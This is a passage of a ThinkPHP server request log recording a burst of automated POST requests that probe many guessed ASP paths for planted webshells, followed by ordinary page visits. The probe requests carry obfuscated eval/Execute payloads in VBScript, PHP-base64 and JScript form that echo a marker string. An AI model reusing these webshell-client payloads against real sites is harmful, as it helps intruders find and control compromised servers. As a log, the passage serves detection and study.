[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'Admin_Ta.asp',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.00it.cn',
  'content-length' => '800',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://www.00it.cn/admin/Admin_Ta.asp',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
  'pass' => 'Execute                              ("                              Execute                              (""          :Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Execute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Execute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Response.Write(""""->|""""):                    Execute                              (""""On Error Resume Next:""""&bd(""""526573706F6E73652E5772697465282268616F72656E67652E636F6D51513331373237353733382229"""")):Response.Write(""""|<-""""):Response.End"")")',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T10:37:50+08:00 ] 172.16.0.5 192.200.218.179 POST /admin/error.asp
[ log ] www.00it.cn/admin/error.asp [运行时间：0.013058s][吞吐率：76.58req/s] [内存消耗：1,360.77kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'error.asp',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.00it.cn',
  'content-length' => '802',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://www.00it.cn/admin/error.asp',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
  'niyade' => 'Execute                              ("                              Execute                              (""          :Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Execute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Execute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Response.Write(""""->|""""):                    Execute                              (""""On Error Resume Next:""""&bd(""""526573706F6E73652E5772697465282268616F72656E67652E636F6D51513331373237353733382229"""")):Response.Write(""""|<-""""):Response.End"")")',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T10:37:54+08:00 ] 172.16.0.5 192.200.218.179 POST /weki.asp
[ log ] www.00it.cn/weki.asp [运行时间：0.015141s][吞吐率：66.05req/s] [内存消耗：1,360.36kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'weki.asp',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.00it.cn',
  'content-length' => '798',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://www.00it.cn/weki.asp',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
  0 => 'Execute                              ("                              Execute                              (""          :Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Execute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Execute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Response.Write(""""->|""""):                    Execute                              (""""On Error Resume Next:""""&bd(""""526573706F6E73652E5772697465282268616F72656E67652E636F6D51513331373237353733382229"""")):Response.Write(""""|<-""""):Response.End"")")',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T10:37:56+08:00 ] 172.16.0.5 192.200.218.179 POST /kdatebase/index_.asp
[ log ] www.00it.cn/kdatebase/index_.asp [运行时间：0.014364s][吞吐率：69.62req/s] [内存消耗：1,360.50kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'kdatebase',
    1 => 'index_.asp',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.00it.cn',
  'content-length' => '802',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://www.00it.cn/kdatebase/index_.asp',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
  'Cne123' => 'Execute                              ("                              Execute                              (""          :Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Execute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Execute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Response.Write(""""->|""""):                    Execute                              (""""On Error Resume Next:""""&bd(""""526573706F6E73652E5772697465282268616F72656E67652E636F6D51513331373237353733382229"""")):Response.Write(""""|<-""""):Response.End"")")',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T10:37:56+08:00 ] 172.16.0.5 192.200.218.179 POST /Somnus/Somnus.asp
[ log ] www.00it.cn/Somnus/Somnus.asp [运行时间：0.012456s][吞吐率：80.28req/s] [内存消耗：1,360.48kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'Somnus',
    1 => 'Somnus.asp',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.00it.cn',
  'content-length' => '805',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://www.00it.cn/Somnus/Somnus.asp',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
  'xiaoliang' => 'Execute                              ("                              Execute                              (""          :Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Execute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Execute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Response.Write(""""->|""""):                    Execute                              (""""On Error Resume Next:""""&bd(""""526573706F6E73652E5772697465282268616F72656E67652E636F6D51513331373237353733382229"""")):Response.Write(""""|<-""""):Response.End"")")',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T10:37:57+08:00 ] 172.16.0.5 192.200.218.179 POST /images/cache.asp
[ log ] www.00it.cn/images/cache.asp [运行时间：0.012215s][吞吐率：81.87req/s] [内存消耗：1,360.48kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'images',
    1 => 'cache.asp',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.00it.cn',
  'content-length' => '803',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://www.00it.cn/images/cache.asp',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
  'rmb2014' => 'Execute                              ("                              Execute                              (""          :Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Execute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Execute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Response.Write(""""->|""""):                    Execute                              (""""On Error Resume Next:""""&bd(""""526573706F6E73652E5772697465282268616F72656E67652E636F6D51513331373237353733382229"""")):Response.Write(""""|<-""""):Response.End"")")',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T10:37:59+08:00 ] 172.16.0.5 192.200.218.179 POST /data/img/css/xianf.ASP
[ log ] www.00it.cn/data/img/css/xianf.ASP [运行时间：0.011669s][吞吐率：85.70req/s] [内存消耗：1,359.75kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'data',
    1 => 'img',
    2 => 'css',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.00it.cn',
  'content-length' => '344',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://www.00it.cn/data/img/css/xianf.ASP',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
  'xf' => '@                                                 eval                                                             (base64_decode($_POST[z0]));',
  'z0' => 'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOztwcmludCgiaGFvcmVuZ2UuY29tUVEzMTcyNzU3MzgiKTs7ZWNobygifDwtIik7ZGllKCk7',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T10:37:59+08:00 ] 172.16.0.5 192.200.218.179 POST /data/img/css/xianf.ASP
[ log ] www.00it.cn/data/img/css/xianf.ASP [运行时间：0.014873s][吞吐率：67.24req/s] [内存消耗：1,360.56kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'data',
    1 => 'img',
    2 => 'css',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.00it.cn',
  'content-length' => '798',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://www.00it.cn/data/img/css/xianf.ASP',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
  'xf' => 'Execute                              ("                              Execute                              (""          :Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Execute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Execute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Response.Write(""""->|""""):                    Execute                              (""""On Error Resume Next:""""&bd(""""526573706F6E73652E5772697465282268616F72656E67652E636F6D51513331373237353733382229"""")):Response.Write(""""|<-""""):Response.End"")")',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T10:38:00+08:00 ] 172.16.0.5 192.200.218.179 POST /data/img/css/xianf.ASP
[ log ] www.00it.cn/data/img/css/xianf.ASP [运行时间：0.011481s][吞吐率：87.10req/s] [内存消耗：1,359.75kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'data',
    1 => 'img',
    2 => 'css',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.00it.cn',
  'content-length' => '347',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://www.00it.cn/data/img/css/xianf.ASP',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
  'xf' => 'Response.Write("------>|");var err:Exception;try{                         eval                    (System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("UmVzcG9uc2UuV3JpdGUoImhhb3JlbmdlLmNvbVFRMzE3Mjc1NzM4Iik7")),"unsafe");}catch(err){Response.Write("ERROR:// "+err.essage);}Response.Write("|<----");Response.End();',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T10:38:01+08:00 ] 172.16.0.5 192.200.218.179 POST /md5.asp
[ log ] www.00it.cn/md5.asp [运行时间：0.011637s][吞吐率：85.93req/s] [内存消耗：1,360.36kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'md5.asp',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.00it.cn',
  'content-length' => '800',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://www.00it.cn/md5.asp',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
  'pass' => 'Execute                              ("                              Execute                              (""          :Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Execute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Execute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Response.Write(""""->|""""):                    Execute                              (""""On Error Resume Next:""""&bd(""""526573706F6E73652E5772697465282268616F72656E67652E636F6D51513331373237353733382229"""")):Response.Write(""""|<-""""):Response.End"")")',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T10:38:02+08:00 ] 172.16.0.5 192.200.218.179 POST /images/Sql.asp
[ log ] www.00it.cn/images/Sql.asp [运行时间：0.016306s][吞吐率：61.33req/s] [内存消耗：1,360.46kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'images',
    1 => 'Sql.asp',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.00it.cn',
  'content-length' => '799',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://www.00it.cn/images/Sql.asp',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
  'rmb' => 'Execute                              ("                              Execute                              (""          :Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Execute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Execute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Response.Write(""""->|""""):                    Execute                              (""""On Error Resume Next:""""&bd(""""526573706F6E73652E5772697465282268616F72656E67652E636F6D51513331373237353733382229"""")):Response.Write(""""|<-""""):Response.End"")")',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T10:38:03+08:00 ] 172.16.0.5 192.200.218.179 POST /manage/Images/Sql.asp
[ log ] www.00it.cn/manage/Images/Sql.asp [运行时间：0.013144s][吞吐率：76.08req/s] [内存消耗：1,360.55kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'manage',
    1 => 'Images',
    2 => 'Sql.asp',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.00it.cn',
  'content-length' => '799',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://www.00it.cn/manage/Images/Sql.asp',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
  'rmb' => 'Execute                              ("                              Execute                              (""          :Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Execute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Execute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Response.Write(""""->|""""):                    Execute                              (""""On Error Resume Next:""""&bd(""""526573706F6E73652E5772697465282268616F72656E67652E636F6D51513331373237353733382229"""")):Response.Write(""""|<-""""):Response.End"")")',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T10:38:04+08:00 ] 172.16.0.5 192.200.218.179 POST /admin/images/Sql.asp
[ log ] www.00it.cn/admin/images/Sql.asp [运行时间：0.012175s][吞吐率：82.13req/s] [内存消耗：1,360.80kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'images',
    2 => 'Sql.asp',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.00it.cn',
  'content-length' => '799',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://www.00it.cn/admin/images/Sql.asp',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
  'rmb' => 'Execute                              ("                              Execute                              (""          :Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Execute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Execute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Response.Write(""""->|""""):                    Execute                              (""""On Error Resume Next:""""&bd(""""526573706F6E73652E5772697465282268616F72656E67652E636F6D51513331373237353733382229"""")):Response.Write(""""|<-""""):Response.End"")")',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T10:38:05+08:00 ] 172.16.0.5 192.200.218.179 POST /images/css/Thumb.asp
[ log ] www.00it.cn/images/css/Thumb.asp [运行时间：0.011353s][吞吐率：88.08req/s] [内存消耗：1,360.52kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'images',
    1 => 'css',
    2 => 'Thumb.asp',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.00it.cn',
  'content-length' => '797',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://www.00it.cn/images/css/Thumb.asp',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
  'a' => 'Execute                              ("                              Execute                              (""          :Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Execute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Execute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Response.Write(""""->|""""):                    Execute                              (""""On Error Resume Next:""""&bd(""""526573706F6E73652E5772697465282268616F72656E67652E636F6D51513331373237353733382229"""")):Response.Write(""""|<-""""):Response.End"")")',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T10:38:07+08:00 ] 172.16.0.5 192.200.218.179 POST /admin/sdfg.asp
[ log ] www.00it.cn/admin/sdfg.asp [运行时间：0.011720s][吞吐率：85.32req/s] [内存消耗：1,360.76kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'sdfg.asp',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.00it.cn',
  'content-length' => '797',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://www.00it.cn/admin/sdfg.asp',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
  'a' => 'Execute                              ("                              Execute                              (""          :Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Execute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Execute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Response.Write(""""->|""""):                    Execute                              (""""On Error Resume Next:""""&bd(""""526573706F6E73652E5772697465282268616F72656E67652E636F6D51513331373237353733382229"""")):Response.Write(""""|<-""""):Response.End"")")',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T10:38:08+08:00 ] 172.16.0.5 192.200.218.179 POST /Templates/test.asp
[ log ] www.00it.cn/Templates/test.asp [运行时间：0.011404s][吞吐率：87.69req/s] [内存消耗：1,360.49kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'Templates',
    1 => 'test.asp',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.00it.cn',
  'content-length' => '801',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://www.00it.cn/Templates/test.asp',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
  'hanyu' => 'Execute                              ("                              Execute                              (""          :Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Execute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Execute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Response.Write(""""->|""""):                    Execute                              (""""On Error Resume Next:""""&bd(""""526573706F6E73652E5772697465282268616F72656E67652E636F6D51513331373237353733382229"""")):Response.Write(""""|<-""""):Response.End"")")',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T11:04:28+08:00 ] 172.16.0.5 114.215.148.82 GET /index.php
[ log ] 123.207.34.110/index.php [运行时间：0.016300s][吞吐率：61.35req/s] [内存消耗：1,683.82kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cache-control' => 'no-cache',
  'connection' => 'Keep-Alive',
  'host' => '123.207.34.110',
  'user-agent' => 'Mozilla/5.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T11:07:14+08:00 ] 172.16.0.5 60.191.38.78 GET /
[ log ] 123.207.34.110:80/ [运行时间：0.015730s][吞吐率：63.57req/s] [内存消耗：1,684.22kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',
  'host' => '123.207.34.110:80',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T11:21:29+08:00 ] 172.16.0.5 203.160.56.107 GET /
[ log ] 123.207.34.110:80/ [运行时间：0.014258s][吞吐率：70.14req/s] [内存消耗：1,683.98kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '123.207.34.110:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T13:21:49+08:00 ] 172.16.0.5 201.184.144.186 GET /
[ log ] 123.207.34.110:80/ [运行时间：0.014178s][吞吐率：70.53req/s] [内存消耗：1,683.98kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'host' => '123.207.34.110:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T13:45:11+08:00 ] 172.16.0.5 43.230.158.62 GET /
[ log ] 123.207.34.110:80/ [运行时间：0.015340s][吞吐率：65.19req/s] [内存消耗：1,683.98kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '123.207.34.110:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-07-08T14:14:39+08:00 ] 172.16.0.5 194.33.127.136 GET /
[ log ] 123.207.34.110:80/ [运行时间：0.014551s][吞吐率：68.72req/s] [内存消耗：1,683.98kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
